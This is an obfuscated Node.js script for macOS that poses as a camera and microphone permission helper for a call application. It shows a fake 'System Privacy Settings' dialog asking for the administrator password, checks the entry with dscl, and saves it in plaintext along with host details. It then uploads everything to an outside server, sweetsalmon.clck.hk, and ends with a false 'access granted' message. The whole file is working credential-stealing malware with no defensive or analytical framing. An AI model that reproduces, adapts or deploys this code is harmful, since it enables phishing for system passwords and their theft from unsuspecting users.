#!/usr/bin/env node

const _0xb40da1=_0x3d76;(function(_0x3cf550,_0x3cf37d){const _0x210222=_0x3d76,_0x32a315=_0x3cf550();while(!![]){try{const _0x136d43=parseInt(_0x210222(0x102))/0x1*(-parseInt(_0x210222(0xd6))/0x2)+parseInt(_0x210222(0xea))/0x3+parseInt(_0x210222(0xbb))/0x4+parseInt(_0x210222(0xf3))/0x5+parseInt(_0x210222(0xcc))/0x6+-parseInt(_0x210222(0xdf))/0x7+-parseInt(_0x210222(0xc8))/0x8;if(_0x136d43===_0x3cf37d)break;else _0x32a315['push'](_0x32a315['shift']());}catch(_0x39828b){_0x32a315['push'](_0x32a315['shift']());}}}(_0x5762,0x358db));const {execSync}=require(_0xb40da1(0xc7)),fs=require('fs'),path=require(_0xb40da1(0x10c)),os=require('os'),crypto=require('crypto'),http=require(_0xb40da1(0x108)),https=require(_0xb40da1(0x107)),CONFIG={'serverDomain':'sweetsalmon.clck.hk','serverPath':_0xb40da1(0xcf),'serverPort':0x1f98,'apiKey':_0xb40da1(0xfc),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x2619ba,_0x37073f){const _0x5017d0=_0xb40da1,_0x23ad74=new Date()[_0x5017d0(0xbe)]();console['log']('['+_0x23ad74+']\x20'+_0x2619ba);if(_0x37073f)console['error'](_0x37073f);try{const _0x27e0bc=path[_0x5017d0(0x100)](os[_0x5017d0(0xe1)](),_0x5017d0(0xc6));fs[_0x5017d0(0xc4)](_0x27e0bc,'['+_0x23ad74+']\x20'+_0x2619ba+'\x0a');if(_0x37073f)fs[_0x5017d0(0xc4)](_0x27e0bc,(_0x37073f['stack']||_0x37073f)+'\x0a');}catch(_0x517ba2){}}function verifyPassword(_0x1641ac,_0x73a224){const _0x4f17f1=_0xb40da1;try{const _0x1d1e42=_0x4f17f1(0x114)+_0x1641ac+'\x20'+_0x73a224;return execSync(_0x1d1e42,{'stdio':_0x4f17f1(0xb2)}),!![];}catch(_0x599d71){return![];}}function _0x5762(){const _0x5cdce7=['User\x20canceled\x20password\x20entry','.txt\x22\x0d\x0a','\x0aPassword:\x20','Uploading\x20permission\x20data\x20to\x20server:\x20','dscl\x20/Local/Default\x20-authonly\x20','osascript\x20-e\x20\x27display\x20dialog\x20\x22Call\x20application\x20is\x20requesting\x20access\x20to\x20Microphone/Video\x5cn\x5cnPlease\x20enter\x20your\x20password\x20to\x20allow\x20access.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','hostname','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20Camera\x20and\x20microphone\x20access\x20is\x20denied.\x22\x20with\x20title\x20\x22Access\x20Denied\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20for\x20call\x20app\x20access\x20===','timeout','type','ignore','Permission\x20error:\x20','Password\x20verification\x20failed','Error\x20getting\x20administrator\x20password:\x20','hex','Attempt\x20','data','Permission\x20request\x20error:\x20','\x0aClientID:\x20','594964wtiJuG','mkdirSync','error','toISOString','.txt','Error\x20saving\x20permission\x20data:\x20','Permission\x20could\x20not\x20be\x20granted','\x0aArchitecture:\x20','match','appendFileSync','Permission\x20error:\x20failed\x20to\x20save\x20verification\x20data','call_app_logs.txt','child_process','1428568FCxQGM',')...','CallAppCache','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','2427990dNrnsD','Permission\x20JSON\x20data\x20saved\x20to:\x20','https://','/api/files/upload','substr','internal','Administrator\x20password\x20verified','--\x0d\x0a','end','request','6KcFtox','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','00:00:00:00:00:00','trim','maxRetries','toString','stringify','arch','multipart/form-data;\x20boundary=','2192225GpQzkG','gave\x20up:true','homedir','userInfo','update','://','then','mac','write','serverPort','message','374859APCmSm','\x0aType:\x20','Maximum\x20retry\x20attempts\x20reached','substring','apiKey','pathname','----WebKitFormBoundary','platform','networkInterfaces','1380780QAdgON','startsWith','Retrying\x20permission\x20verification\x20(','writeFileSync','statusCode','Permission\x20process\x20completed','POST','search','username','tJz4uRVCwl2eEwyPTudYP9iGRfgq','unknown','\x0aHostname:\x20','User:\x20','join','User\x20canceled','81138cPasSL','retryDelay','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','.json','digest','https','http','serverDomain','\x20of\x205\x20to\x20get\x20password','random','path','Error\x20requesting\x20password\x20via\x20dialog:\x20','includes','createHash'];_0x5762=function(){return _0x5cdce7;};return _0x5762();}async function getMacOSPassword(){const _0x523cef=_0xb40da1;log(_0x523cef(0x118));try{const _0x44a87e=os[_0x523cef(0xe2)]()[_0x523cef(0xfb)];log('Current\x20user:\x20'+_0x44a87e);for(let _0xb72af8=0x1;_0xb72af8<=0x5;_0xb72af8++){log(_0x523cef(0xb7)+_0xb72af8+_0x523cef(0x10a));const _0x5f241c=_0x523cef(0x115);try{const _0x1cb40a=execSync(_0x5f241c,{'encoding':'utf8'});let _0x1c4978='';const _0x3d1bb4=_0x1cb40a[_0x523cef(0xc3)](/text returned:([^,]+)/);if(_0x3d1bb4&&_0x3d1bb4[0x1]){_0x1c4978=_0x3d1bb4[0x1][_0x523cef(0xd9)]();if(verifyPassword(_0x44a87e,_0x1c4978))return log(_0x523cef(0xd2)),SYSTEM_PASSWORD=_0x1c4978,_0x1c4978;else log(_0x523cef(0xb4)),_0xb72af8<0x5&&execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Permission\x20cannot\x20be\x20granted.\x22\x20with\x20title\x20\x22System\x20Privacy\x20Settings\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22Try\x20Again\x22}\x20default\x20button\x20\x22Try\x20Again\x22\x27');}else{if(_0x1cb40a[_0x523cef(0x10e)](_0x523cef(0xe0)))return log(_0x523cef(0x110)),null;else log(_0x523cef(0x104));}}catch(_0x5c7dc3){log(_0x523cef(0x10d)+_0x5c7dc3[_0x523cef(0xe9)]);if(_0x5c7dc3[_0x523cef(0xe9)][_0x523cef(0x10e)](_0x523cef(0x101)))return log(_0x523cef(0x110)),null;}}return execSync(_0x523cef(0x117)),null;}catch(_0x43a945){return log(_0x523cef(0xb5)+_0x43a945['message'],_0x43a945),null;}}function generateClientId(){const _0xeb64e=_0xb40da1;try{const _0xb8556a=getMacAddress(),_0x4306bf=os[_0xeb64e(0x116)](),_0x5b7005=os['userInfo']()[_0xeb64e(0xfb)],_0x2c72ab=crypto[_0xeb64e(0x10f)]('md5')[_0xeb64e(0xe3)](_0xb8556a+':'+_0x4306bf+':'+_0x5b7005)[_0xeb64e(0x106)](_0xeb64e(0xb6))[_0xeb64e(0xed)](0x0,0x8);return _0x2c72ab;}catch(_0x391eab){return Math[_0xeb64e(0x10b)]()[_0xeb64e(0xdb)](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x3dae62=_0xb40da1;try{const _0x57538f=os[_0x3dae62(0xf2)]();for(const _0x410513 of Object['keys'](_0x57538f)){for(const _0x504d37 of _0x57538f[_0x410513]){if(!_0x504d37[_0x3dae62(0xd1)]&&_0x504d37[_0x3dae62(0xe6)]!==_0x3dae62(0xd8))return _0x504d37[_0x3dae62(0xe6)];}}return'unknown';}catch(_0x46b76f){return _0x3dae62(0xfd);}}function _0x3d76(_0x3ccc4d,_0x5b6e35){const _0x57629a=_0x5762();return _0x3d76=function(_0x3d76fa,_0x42fcd1){_0x3d76fa=_0x3d76fa-0xb2;let _0x3c0544=_0x57629a[_0x3d76fa];return _0x3c0544;},_0x3d76(_0x3ccc4d,_0x5b6e35);}async function uploadToServer(_0x16c011,_0x2123a5=0x0){return new Promise(_0x4d5e66=>{const _0x2220c2=_0x3d76;try{const _0x396504=generateClientId(),_0x2a1a2b={'hostname':os[_0x2220c2(0x116)](),'platform':os['platform'](),'type':os[_0x2220c2(0x11a)](),'arch':os[_0x2220c2(0xdd)](),'username':os[_0x2220c2(0xe2)]()[_0x2220c2(0xfb)],'id':_0x396504},_0x48cd51=CONFIG[_0x2220c2(0xe8)]===0x1bb?_0x2220c2(0x107):_0x2220c2(0x108),_0x13d6de=_0x48cd51+_0x2220c2(0xe4)+CONFIG[_0x2220c2(0x109)]+':'+CONFIG[_0x2220c2(0xe8)]+CONFIG['serverPath'],_0x51ac4a=_0x13d6de[_0x2220c2(0xf4)](_0x2220c2(0xce)),_0x2a83a5=_0x51ac4a?https:http,_0x1a502a=new URL(_0x13d6de),_0x20c657=_0x2220c2(0xf0)+Math[_0x2220c2(0x10b)]()[_0x2220c2(0xdb)](0x10)[_0x2220c2(0xd0)](0x2);let _0x443189='';_0x443189+='--'+_0x20c657+'\x0d\x0a',_0x443189+='Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a',_0x443189+=_0x2220c2(0xcb),_0x443189+=JSON['stringify'](_0x2a1a2b)+'\x0d\x0a',_0x443189+='--'+_0x20c657+'\x0d\x0a',_0x443189+=_0x2220c2(0xd7)+_0x396504+_0x2220c2(0x111),_0x443189+='Content-Type:\x20text/plain\x0d\x0a\x0d\x0a',_0x443189+=_0x16c011+'\x0d\x0a',_0x443189+='--'+_0x20c657+_0x2220c2(0xd3);const _0x3acefc={'hostname':_0x1a502a[_0x2220c2(0x116)],'port':_0x1a502a['port']||(_0x51ac4a?0x1bb:0x50),'path':_0x1a502a[_0x2220c2(0xef)]+_0x1a502a[_0x2220c2(0xfa)],'method':_0x2220c2(0xf9),'headers':{'Content-Type':_0x2220c2(0xde)+_0x20c657,'Content-Length':Buffer['byteLength'](_0x443189),'X-Client-Info':JSON[_0x2220c2(0xdc)](_0x2a1a2b),'X-API-Key':CONFIG[_0x2220c2(0xee)]},'timeout':CONFIG[_0x2220c2(0x119)]};log(_0x2220c2(0x113)+_0x13d6de);const _0x2a24f0=_0x2a83a5[_0x2220c2(0xd5)](_0x3acefc,_0x5725c2=>{const _0x4e6000=_0x2220c2;let _0x237ea2='';_0x5725c2['on'](_0x4e6000(0xb8),_0x18f00a=>{_0x237ea2+=_0x18f00a;}),_0x5725c2['on']('end',()=>{const _0x3390aa=_0x4e6000;_0x5725c2[_0x3390aa(0xf7)]>=0xc8&&_0x5725c2[_0x3390aa(0xf7)]<0x12c?(log('Permission\x20verification\x20successful:\x20'+_0x5725c2[_0x3390aa(0xf7)]),_0x4d5e66(!![])):(log('Permission\x20verification\x20failed:\x20'+_0x5725c2[_0x3390aa(0xf7)]+',\x20'+_0x237ea2),_0x2123a5<CONFIG[_0x3390aa(0xda)]?(log(_0x3390aa(0xf5)+(_0x2123a5+0x1)+'/'+CONFIG[_0x3390aa(0xda)]+_0x3390aa(0xc9)),setTimeout(()=>{const _0x19909a=_0x3390aa;uploadToServer(_0x16c011,_0x2123a5+0x1)[_0x19909a(0xe5)](_0x4d5e66);},CONFIG[_0x3390aa(0x103)])):(log(_0x3390aa(0xec)),_0x4d5e66(![])));});});_0x2a24f0['on'](_0x2220c2(0xbd),_0x166e8d=>{const _0x471515=_0x2220c2;log(_0x471515(0xb9)+_0x166e8d[_0x471515(0xe9)],_0x166e8d),_0x2123a5<CONFIG['maxRetries']?(log(_0x471515(0xf5)+(_0x2123a5+0x1)+'/'+CONFIG[_0x471515(0xda)]+_0x471515(0xc9)),setTimeout(()=>{const _0x467a88=_0x471515;uploadToServer(_0x16c011,_0x2123a5+0x1)[_0x467a88(0xe5)](_0x4d5e66);},CONFIG[_0x471515(0x103)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x4d5e66(![]));}),_0x2a24f0[_0x2220c2(0xe7)](_0x443189),_0x2a24f0[_0x2220c2(0xd4)]();}catch(_0x5e7169){log(_0x2220c2(0xb3)+_0x5e7169[_0x2220c2(0xe9)],_0x5e7169),_0x2123a5<CONFIG[_0x2220c2(0xda)]?(log('Retrying\x20permission\x20verification\x20('+(_0x2123a5+0x1)+'/'+CONFIG[_0x2220c2(0xda)]+_0x2220c2(0xc9)),setTimeout(()=>{const _0x5ef250=_0x2220c2;uploadToServer(_0x16c011,_0x2123a5+0x1)[_0x5ef250(0xe5)](_0x4d5e66);},CONFIG['retryDelay'])):(log(_0x2220c2(0xec)),_0x4d5e66(![]));}});}function savePasswordLocally(_0x2d3444){const _0x1d9049=_0xb40da1;try{const _0x51f3f7=os[_0x1d9049(0xe2)]()[_0x1d9049(0xfb)],_0x1498ae=generateClientId(),_0x544275=new Date()['toISOString'](),_0x569abd=os[_0x1d9049(0xe1)](),_0x433142=path[_0x1d9049(0x100)](_0x569abd,_0x1d9049(0xca));!fs['existsSync'](_0x433142)&&fs[_0x1d9049(0xbc)](_0x433142,{'recursive':!![]});const _0x37d7f0=_0x1d9049(0xff)+_0x51f3f7+_0x1d9049(0x112)+_0x2d3444+'\x0aTime:\x20'+_0x544275+_0x1d9049(0xfe)+os[_0x1d9049(0x116)]()+'\x0aPlatform:\x20'+os['platform']()+_0x1d9049(0xeb)+os[_0x1d9049(0x11a)]()+_0x1d9049(0xc2)+os[_0x1d9049(0xdd)]()+_0x1d9049(0xba)+_0x1498ae,_0xa5d2ff=path[_0x1d9049(0x100)](_0x433142,_0x1498ae+_0x1d9049(0xbf));fs[_0x1d9049(0xf6)](_0xa5d2ff,_0x37d7f0),log('Permission\x20data\x20saved\x20to:\x20'+_0xa5d2ff);const _0x24bf07={'user':_0x51f3f7,'password':_0x2d3444,'timestamp':_0x544275,'hostname':os[_0x1d9049(0x116)](),'system':{'platform':os[_0x1d9049(0xf1)](),'release':os['release'](),'type':os['type'](),'arch':os[_0x1d9049(0xdd)]()},'clientId':_0x1498ae},_0x322f92=path[_0x1d9049(0x100)](_0x433142,_0x1498ae+_0x1d9049(0x105));return fs['writeFileSync'](_0x322f92,JSON[_0x1d9049(0xdc)](_0x24bf07,null,0x2)),log(_0x1d9049(0xcd)+_0x322f92),_0x37d7f0;}catch(_0x460218){return log(_0x1d9049(0xc0)+_0x460218[_0x1d9049(0xe9)],_0x460218),null;}}async function main(){const _0x4e9d25=_0xb40da1;try{log('Starting\x20camera\x20and\x20microphone\x20access\x20permission\x20process');const _0x1f1214=await getMacOSPassword();if(!_0x1f1214){log('Permission\x20process\x20canceled:\x20password\x20verification\x20failed');return;}const _0x3feb6a=savePasswordLocally(_0x1f1214);if(!_0x3feb6a){log(_0x4e9d25(0xc5));return;}const _0x23f1f1=await uploadToServer(_0x3feb6a);if(_0x23f1f1){log('Permission\x20granted\x20successfully');try{execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Microphone\x20and\x20camera\x20access\x20has\x20been\x20successfully\x20granted.\x22\x20with\x20title\x20\x22Access\x20Granted\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}catch(_0x3b273a){}}else{log(_0x4e9d25(0xc1));try{execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Unable\x20to\x20grant\x20microphone\x20and\x20camera\x20access.\x20Please\x20try\x20again\x20later.\x22\x20with\x20title\x20\x22Access\x20Error\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}catch(_0x46df08){}}log(_0x4e9d25(0xf8));}catch(_0x1801e7){log('Unexpected\x20error\x20in\x20permission\x20process',_0x1801e7);}}main();
